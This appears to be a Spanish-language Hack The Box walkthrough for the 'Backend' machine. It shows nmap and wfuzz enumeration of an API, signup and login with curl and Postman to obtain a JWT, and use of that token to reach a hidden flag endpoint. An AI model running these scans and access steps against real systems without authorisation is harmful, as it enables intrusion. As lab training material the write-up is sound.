
---

**Máquina:** Backend

**Plataforma:** Hack The Box

**Laboratorio:** https://app.hackthebox.com/machines/Backend

**Target:** 10.10.11.161

**Herramientas**: [Postman](../../../../Herramientas/Postman/Postman.md), **Nmap**, **cURL**, **Wfuzz**


---
# Guía de explotación paso a paso 'Backend'

## Paso 1 - NMAP

Acción: escaneo inicial con nmap

```Shell
nmap -p- --open -sS -n -Pn --min-rate 5000 -vvv 10.10.11.161 -oG allPorts
```

Resultado:

```Shell
	[*] IP Address: 10.10.11.161
	[*] Open ports: 22,80
```

Acción:

```bash
 curl -s -X GET http://10.10.11.161
```

Resultado:

```bash
{"msg":"UHC API Version 1.0"}   
```

Explicación: servidor http corriendo por el puerto 80, es una API

## Paso 2 -

Acción: 

```Shell
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.161/FUZZ
```

Resultado:

```Shell
000000090:   401        0 L      2 W        30 Ch       "docs"                                                                                                                
000001026:   200        0 L      1 W        20 Ch       "api"       
```

Explicación: encontramos una ruta que confirma la existencia de una API, si fuzzeamos por las rutas que vamos encontrando podemos ir obteniendo sus diferentes endpoint. Desde el navegador vemos que nos proporciona el siguiente endpoint.


*Resultado del navegador para las rutas encontrada*

![Captura de pantalla](./Imágenes/web_1.png)

![Captura de pantalla](./Imágenes/web_2.png)

## Paso 3 - WFUZZ

Acción: 

```Shell
wfuzz -c --hc=404,422 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.161/api/v1/user/FUZZ
```

Alternativas para mejorar resultados (filtrando) pero es recomendable no descartar endpoint como `/user/info` por ejemplo

```bash
wfuzz -c --hc=404,422 --hh=4 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.161/api/v1/user/FUZZ

wfuzz -c --hc=404,422 --hh=4 -z range,1-1000 -u http://10.10.11.161/api/v1/user/FUZZ
```

Resultado:

```Shell
000000018:   200        0 L      1 W        4 Ch        "2006"                                                                                                                
000000034:   200        0 L      1 W        4 Ch        "10"                                                                                                                  
000000030:   200        0 L      1 W        4 Ch        "11"                                                                                                                  
000000024:   200        0 L      1 W        4 Ch        "12"                                                                                                                  
000000041:   200        0 L      1 W        4 Ch        "2005"                                                                                                                
000000045:   200        0 L      1 W        141 Ch      "1"                                                                                                                   
000000050:   200        0 L      1 W        4 Ch        "06"
```

Explicación: probando vemos que solo tenemos acceso al `/user/1` que coincide con ser el único que indica que tiene 141 caracteres y no 4 como los demás

![Captura de pantalla](./Imágenes/web_4.png)


Acción: 

```Shell
wfuzz -c -X POST --hc=405 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.161/api/v1/user/FUZZ
```

Resultado:

```Shell
000000053:   422        0 L      3 W        172 Ch      "login"                                                                                                               
000000217:   422        0 L      2 W        81 Ch       "signup" 
```

Alternativa que aglutina todo (más lenta)

```bash
wfuzz -c --hc=405,404 --hh=4 -z list,GET,-PUT,-POST -X FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.161/api/v1/user/FUZ2Z
```


Explicación: 

## Paso 4 - Postman y cURL

Acción: desde [Postman](../../../../Herramientas/Postman/Postman.md) accedemos al endpoint encontrado con [Wfuzz](../../../../Herramientas/Enumeración%20Web/Wfuzz) (usando el método **POST**, ya que en el navegador solo permite hacer peticiones *GET*)

![Captura de pantalla](./Imágenes/postman_1.png)

Acción: método **curl**

```Shell
curl -s -X POST http:/10.10.11.161/api/v1/user/login | jq

---

curl -s -X POST http:/10.10.11.161/api/v1/user/signup | jq
```

Resultado:

```Shell
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}

---

{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

Acción: 

```Shell
curl -s -X GET http://10.10.11.161/api/v1/user/1 | jq
```

Resultado:

```Shell
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
```

Explicación: en estos endpoint podríamos usar la información `guid-email` para de algún modo iniciar sesión


Acción: 

```Shell
curl -s -X POST http:/10.10.11.161/api/v1/user/login -d 'username=test&password=test' | jq
```

Resultado:

```Shell
{
  "detail": "Incorrect username or password"
}
```


![Captura de pantalla](./Imágenes/postmane_2.png)

En *Postman* espera datos tipo formulario (application/x-www-form-urlencoded).

Explicación: 

Acción:

```bash
curl -s -X POST http:/10.10.11.161/api/v1/user/signup -d 'email=test@mail.com&password=test' | jq

---

curl -s -X POST http:/10.10.11.161/api/v1/user/signup -H "Content-Type: application/json" -d '{"email": "metahumo@mail.com", "password": "metahumo123"}' | jq

---

curl -s -X POST http:/10.10.11.161/api/v1/user/signup -H "Content-Type: application/json" -d '{"email": "metahumo@mail.com", "password": "metahumo123"}' | jq
```

Resultado:

```bash
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "value is not a valid dict",
      "type": "type_error.dict"
    }
  ]
}

---

{}

---
{
  "detail": "The user with this username already exists in the system"
}

```

Explicación: *primero* vimos que por el método POST y usando (application/x-www-form-urlencoded) nos daba error. *Segundo* probamos usando un método **json**, donde obtenemos una respuesta `{}`, que donde *tercero*, corroboramos que hemos creado un usuario válido


![Captura de pantalla](./Imágenes/postman_3.png)


![Captura de pantalla](./Imágenes/postman_4.png)

Con *Postman* vemos que efectivamente hemos creado un usuario y que tenemos acceso a un **JWT** tipo **bearer**

![Captura de pantalla](./Imágenes/postman_5.png)


![Captura de pantalla](./Imágenes/postman_6.png)


Explicación: añadimos el token encontrado como variable al repositorio que almacena todas las peticiones. Para poder arrastrar el token a las siguientes que añadamos

Acción:

```bash
curl -s -X POST http:/10.10.11.161/api/v1/user/login -d 'username=metahumo@mail.com&password=metahumo123' | jq
```

Resultado:

```bash
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzUwMDE4ODAwLCJpYXQiOjE3NDkzMjc2MDAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiOGFiOTgxN2MtZWM1OC00NDlhLThhMTctZmRmNjhjY2M4ZTZjIn0.s4eezZua1Wq-bhrxZ9T8HjK4K67hgQj3ad6_ketbYkE",
  "token_type": "bearer"
}
```

Explicaicón: mismo resultado con cURL

Desde la página de https://jwt.io/ vemos que el token tiene esta estructura

```lua
{
  "type": "access_token",
  "exp": 1750018800,
  "iat": 1749327600,
  "sub": "2",
  "is_superuser": false,
  "guid": "8ab9817c-ec58-449a-8a17-fdf68ccc8e6c"
}
```

Acción:

```bash
curl -s -X GET http:/10.10.11.161/api/v1/admin/ -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzUwMDE4ODAwLCJpYXQiOjE3NDkzMjc2MDAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiOGFiOTgxN2MtZWM1OC00NDlhLThhMTctZmRmNjhjY2M4ZTZjIn0.s4eezZua1Wq-bhrxZ9T8HjK4K67hgQj3ad6_ketbYkE" | jq
```

Resultado:

```bash
{
  "results": false
}
```


![Captura de pantalla](./Imágenes/postman_7.png)

Configuramos [Burp Suite](../../../../Herramientas/Burp%20Suite/BurpSuite.md) para arrastrar el token en las solicitudes del navegador

![Captura de pantalla](./Imágenes/burpsuite_config_token.png)

Vemos que al interceptar tenemos la cabecera `Authorization` tal y como la configuramos, al darle a forward obtendremos la respuesta al igual que con cURL y Postman

![Captura de pantalla](./Imágenes/burpsuite_2.png)

**Endpoint clave** en el que tenemos acceso con el token, vemos un endpoint para una flag y el método a usar que es `PUT`

![Captura de pantalla](./Imágenes/web_5.png)

Acción:

```bash
curl -s -X PUT http://10.10.11.161/api/v1/user/SecretFlagEndpoint -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzUwMDE4ODAwLCJpYXQiOjE3NDkzMjc2MDAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiOGFiOTgxN2MtZWM1OC00NDlhLThhMTctZmRmNjhjY2M4ZTZjIn0.s4eezZua1Wq-bhrxZ9T8HjK4K67hgQj3ad6_ketbYkE" | jq
```

Resultado:

```bash
{
  "user.txt": "7364b78e083..."
}
```

Explicación: en este endpoint logramos obtener la flag de esta máquina. Para ello hemos necesitado registrar un usuario con el método POST y luego loguernos con él para obtener su JWT y añadirlo a la solicitud de este endpoint `/docs` que mostraba la información que necesitabamos

Vemos lo mismo usando [Burp Suite](../../../../Herramientas/Burp%20Suite/BurpSuite.md)

![Captura de pantalla](./Imágenes/burpsuite_3.png)

Vemos lo mismo usando [Postman](../../../../Herramientas/Postman/Postman.md)

![Captura de pantalla](./Imágenes/postman_8.png)

---

